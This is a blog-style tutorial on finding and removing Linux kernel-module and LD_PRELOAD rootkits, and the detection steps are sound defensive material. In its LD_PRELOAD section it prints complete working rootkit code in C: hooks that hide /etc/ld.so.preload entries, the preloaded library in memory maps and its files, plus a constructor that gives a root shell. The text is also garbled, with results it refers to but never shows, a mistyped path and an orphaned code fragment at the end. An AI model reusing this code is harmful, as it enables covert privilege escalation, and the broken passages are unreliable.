************************************************************
* Defeating LKM and LD_PRELOAD rootkits for fun and profit *
************************************************************

Published July 24, 2026 09:33:29 AM by Marc Carlson

Before we begin, if you suspect you have a rootkit installed, it is important that you take your system offline, so disconnect your system first.

Defeating ftrace based rootkits IS possible. Here, I will show you a few things that might be of help to you in identifying and disabling ftrace based rootkits.. First, we are going to look at kernel tracing. Very simple to do, yet a very powerful tool.

# sudo cat /sys/kernel/tracing/enabled_functions

Below we can see an example of what this can tell us.

__x64_sys_kill (1) R I     M 	tramp: 0xffffffffc05dc000 (fh_ftrace_thunk+0x0/0xa0 [deception]) ->ftrace_ops_assist_func+0x0/0x100
__x64_sys_getdents64 (1) R I     M 	tramp: 0xffffffffc05ce000 (fh_ftrace_thunk+0x0/0xa0 [deception]) ->ftrace_ops_assist_func+0x0/0x100
__x64_sys_recvmsg (1) R I     M 	tramp: 0xffffffffc05c9000 (fh_ftrace_thunk+0x0/0xa0 [deception]) ->ftrace_ops_assist_func+0x0/0x100
tcp6_seq_show (1) R I     M 	tramp: 0xffffffffc05dd000 (fh_ftrace_thunk+0x0/0xa0 [deception]) ->ftrace_ops_assist_func+0x0/0x100

We can see exactly what is being hooked as well as the name of the kernel module doing the hooking. This shows us the module [deception] is at work here, even though the module is hidden. This is extremely helpful. Here the module was installed without its name being changed. So we now know that the rootkit deception is installed on our system. If you want to further inspect what the module is doing, you can temporarily disable ftrace in order to see what the module is doing. I.E, hiding ports or processes.

# sudo sysctl kernel.ftrace_enabled=0

Once you run this command, you can use your system tools like ss, netstat and ps to show you what the rootkit has been hiding from you.

Since we now know the name of the rootkit, we can look at options to completely disable and remove it. A lot of rootkits have simple kill commands to control the kernel module such as kill -63 0 to make module visible in lsmod or kill -64 0 to give root privileges. We can simply use

# kill -63 0

to unhide the module, followed by

# sudo rmmod deception

However, in the case of deception, the exact command is variable according to a user defined PID (or magic number). For example, the exact command to reveal the module might be kill -63 8000. So we don't know in this case what the exact command is. So now what? Let's assume the module has not been made persistent by the use of a cronjob, dkms or a service file. Also, /etc/modules-load.d/ (variable on different distros) can load modules while booting. A kernel module, once installed, if not made persistent, can be cleared from the kernel simply by rebooting. If a reboot does not resolve the problem, it might be being made persistent by one of these methods.

*******************************************************************
* What if a reboot doesn't clear the kernel of suspected rootkit? *
*******************************************************************

So... lets start with cronjobs. We can check our cronjobs like this

# crontab -l
  
Be sure to check roots crontab as well as your own user. If a suspicious entry is present, you can stop it from executing by placing a # at the beginning of the line.

Now lets move on to dkms

# sudo dkms status

This will show you any modules that are being installed by dkms during boot. If you find a suspicious module, you can remove it by using

# sudo dkms remove deception/1.0

Another place, that can start a module during boot is service files, which reside in /etc/systemd/system on systemd based linux distros. So take a look here and look through the service files. If you find a suspicious one, you can use the following

# sudo systemctl stop deception

and also

# sudo systemctl disable deception

This will prevent the module from loading during boot.

Finally, the last place we want to look is the /etc/modules-load.d/ directory. The exact directory can be slightly different depending on your distro. Here you might find a number of files named *.conf and will contain the line (for example)

deception

You can disable it like this

# sudo mv /etc/modules-load.d/filename.conf /etc/modules-load.d/filename.conf.disabled

Once you have identified the modules means of staying persistent and have followed these steps, simply reboot and your system should be free of the rootkit!

************************************************************
* What about kernel module rootkits that don't use ftrace? *
************************************************************

In the case of diamorphine (which doesn't use ftrace or kprobes) or rootkits that use kprobes (this works for ftrace also), you can identify the hidden module as well as a list of available kernel functions using

# sudo cat /sys/kernel/tracing/available_filter_functions

And the result in the case of diamorphine

hacked_getdents64 [diamorphine]
hacked_getdents [diamorphine]
resolve_sym [diamorphine]
get_syscall_table_bf [diamorphine]
find_task [diamorphine]
is_invisible [diamorphine]
give_root [diamorphine]
module_show [diamorphine]
module_hide [diamorphine]
hacked_kill [diamorphine]
flipswitch_func [diamorphine]

Diamorphine LKM, as we know, is revealed in lsmod with

# kill -63 0

Once revealed, you can remove it using

# sudo rmmod diamorphine

You can use unhide to view hidden processes prior to removing the module.

# sudo unhide proc

If you suspect a kprobes based rootkit, you can disable kprobes using

# echo 0 | sudo tee /sys/kernel/debug/kprobes/enabled

This will immediately disarm any kprobe running on your system. This will also allow you to investigate further.

*****************************************************************************
* What about LD_PRELOAD rootkits? Is it possible to detect and remove them? *
*****************************************************************************

The obvious place to look for LD_PRELOAD rootkits is in /etc/ld.so.preload. Although the shared libraries could be loaded through .bashrc. In most cases though, you could identify the shared library by simply looking for the entry in /etc/ld.so.preload. The problem here is that the call to read /etc/ld.so.preload can be intercepted and redirected to say, a blank dummy file making it look as though there is nothing in /etc/ld.so.preload. The c code below will do just that. It intercepts a call to say /etc/ld.so.preload and redirects it to the dummy file. The dummy file must be created first. Once that is done,a command such as cat /etc/ld.so.preload will be intercepted and redirected to the blank dummy file. In this way, it appears there is no shared libraries being loaded by the ld preloader.

# sudo touch /etc/ld.so.preload.dummy

/* intercept.c - updated 7/28/26 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/types.h>

#define PRELOAD_PATH "/etc/ld.so.preload"
#define DUMMY_PRELOAD "/etc/ld.so.preload.dummy"

__thread int inside_hook = 0;

static const char* get_target_path(const char *pathname, int flags, va_list args, mode_t *mode) {
    if (flags & O_CREAT) {
        *mode = va_arg(args, mode_t);
    }
    if (!inside_hook && pathname && strcmp(pathname, PRELOAD_PATH) == 0) {
        return DUMMY_PRELOAD;
    }
    return pathname;
}

int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char*, int, mode_t) = NULL;
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

    mode_t mode = 0;
    va_list args;
    va_start(args, flags);
    const char *target = get_target_path(pathname, flags, args, &mode);
    va_end(args);

    return orig_open(target, flags, mode);
}

int open64(const char *pathname, int flags, ...) {
    static int (*orig_open64)(const char*, int, mode_t) = NULL;
    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");

    mode_t mode = 0;
    va_list args;
    va_start(args, flags);
    const char *target = get_target_path(pathname, flags, args, &mode);
    va_end(args);

    return orig_open64(target, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");

    mode_t mode = 0;
    va_list args;
    va_start(args, flags);
    const char *target = get_target_path(pathname, flags, args, &mode);
    va_end(args);

    return orig_openat(dirfd, target, flags, mode);
}

It is clear from the results, that the shared library libhide.so.2 is being preloaded and resides in virtual memory. The problem here is, it is trivial to hide this information. If one were to compile the following into the libhide.so.2 code, neither ldd nor /proc/self/maps would show the shared library libhide.so.2

/* memhide.c */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*real_read)(int, void *, size_t) = dlsym(RTLD_NEXT, "read");
    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *match;

        size_t remaining = result;

        while ((match = memmem(start, remaining, "libhide.so.2", 12)) != NULL) {
            char *buffer_root = (char *)buf;
            char *buffer_end = buffer_root + result;

            char *line_start = memrchr(buffer_root, '\n', match - buffer_root);
            line_start = line_start ? line_start + 1 : buffer_root;

            char *line_end = memchr(match, '\n', buffer_end - match);
            line_end = line_end ? line_end + 1 : buffer_end;

            size_t line_len = line_end - line_start;

            // Shift the remaining data forward
            memmove(line_start, line_end, buffer_end - line_end);

            // Update the global result size
            result -= line_len;

            // Move the scanning pointer forward to the modification point
            start = line_start;
            remaining = buffer_end - line_end;
        }
    }
    return result;
}

So...if the call to read /etc/ld.so.preload can be intercepted and redirected and the library can be hidden from virtual memory, how then can we identify and disable the shared library? Here, strace comes to the rescue. By tracing the call to read /etc/ld.so.preload, we can find out a couple of important things. One, we can find and identify the shared library itself as well as the interception and redirection to the blank dummy file.

# strace cat /etc/ld.so.preload

The results are very telling. The first line of the results that is pertinent, which identifies libhide.so.2 as being accessed early on looks like the following

openat(AT_FDCWD, "/usr/local/lib/libhide.so.2", O_RDONLY|O_CLOEXEC) = 6

The second line which is noteworthy looks like this

openat(AT_FDCWD, "/etc/ld.so.preload.dummy", O_RDONLY) = 6

So, this tells us two things. First, when we try to read /etc/ld.so.preload, a shared library at /usr/local/lib/libhide.so.2 is being accessed as well as, second, a dummy file is being opened instead of the real file. But if we look at the directory listing for /usr/local/lib/, it shows us nothing by the name of libhide.so.2 resides there. That is because of the following code which hides the shared library from tools like ls.

/* hide.c - updated 7/29/26 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>

#define LIB_TO_HIDE "libhide.so.2"
#define DUMMY_FILE  "ld.so.preload.dummy"

int __getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
    static int (*orig_getdents64)(unsigned int, struct dirent*, unsigned int) = NULL;
    if (!orig_getdents64) {
        orig_getdents64 = dlsym(RTLD_NEXT, "__getdents64");
    }

    int total_bytes = orig_getdents64(fd, dirp, count);
    if (total_bytes <= 0) return total_bytes;

    int bpos = 0;
    while (bpos < total_bytes) {
        struct dirent *d = (struct dirent *) ((char *)dirp + bpos);

        // Checks both defined strings
        if (strcmp(d->d_name, LIB_TO_HIDE) == 0 || strcmp(d->d_name, DUMMY_FILE) == 0) {
            int remaining_bytes = total_bytes - (bpos + d->d_reclen);
            memmove(d, (char *)d + d->d_reclen, remaining_bytes);
            total_bytes -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    return total_bytes;
}

// Hook readdir (used by standard C programs)
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // If either matches, skip it and get the next entry
        if (strcmp(entry->d_name, LIB_TO_HIDE) == 0 || strcmp(entry->d_name, DUMMY_FILE) == 0) {
            continue;
        }
        return entry;
    }
    return NULL;
}

So far we have looked at intercepting/redirecting for stealth. Hiding the module itself as well as hiding the entry in virtual memory. What's the point? Well let's say the rootkits primary payload is a rootshell. which could be done with the following code.

/* rootshell.c */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    if (getenv("rootshell")) {
        unsetenv("rootshell");
        unsetenv("LD_PRELOAD");
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
    }
}

In this way, the attacker could type

# rootshell=1 su

and would get a rootshell.

While the other code snippets on this page can be tested with LD_PRELOAD after compiling. Example, LD_PRELOAD=./hide.so ls -l, the rootshell code has to actually be preloaded by /etc/ld.so.preload in order to work correctly.

As illustrated earlier, using strace leaves nowhere to hide. Now that we know the name of the shared library that is doing the hiding and intercepting is named libhide.so.2 in the /usr/local/lib/ directory, we can simply rename the file and then open the real /etc/ld.so.preload and remove the shared library from being preloaded.

# sudo mv /usr/local/lib/libhide.so.2 /usr/local/lib/libhide.so.2.disabled

One last thing. if you have colored text that is really annoying when you use strace, you can disable colors like this

# strace --color=never cat /etc/ld/so.preload

This works in strace version 7.0, but not earlier.

                syscall(SYS_close, fd);
                return 1;
